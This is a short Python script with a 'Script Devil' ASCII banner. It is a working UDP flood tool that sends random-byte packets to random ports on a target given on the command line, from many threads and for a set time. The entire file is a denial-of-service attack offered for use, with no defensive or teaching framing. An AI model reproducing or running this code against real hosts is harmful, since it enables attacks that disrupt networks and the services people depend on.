import socket, time, random, threading, sys

print("""   
   _____           _       _     _____             _ _ 
  / ____|         (_)     | |   |  __ \           (_) |
 | (___   ___ _ __ _ _ __ | |_  | |  | | _____   ___| |
  \___ \ / __| '__| | '_ \| __| | |  | |/ _ \ \ / / | |
  ____) | (__| |  | | |_) | |_  | |__| |  __/\ V /| | |
 |_____/ \___|_|  |_| .__/ \__| |_____/ \___| \_/ |_|_|
                    | |                                
                    |_|                                """)

try:
	Target = str(sys.argv[1])
	Threads = int(sys.argv[2])
	Timer = float(sys.argv[3])

except IndexError:
	print("You did not enter the parameters correctly, Usage: target, threads, time")

Timeout = time.time() + 1 * Timer

def Attack():
	try:
		Bytes = random._urandom(1024)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while time.time() < Timeout:
			dport = random.randint(22, 55500)
			sock.sendto(Bytes*random.randint(5,22), (Target, dport))
		return
	except Exception as Error:
		print(Error)

print("The attack has begun.")

for _ in range(0, Threads):
	threading.Thread(target=Attack).start()
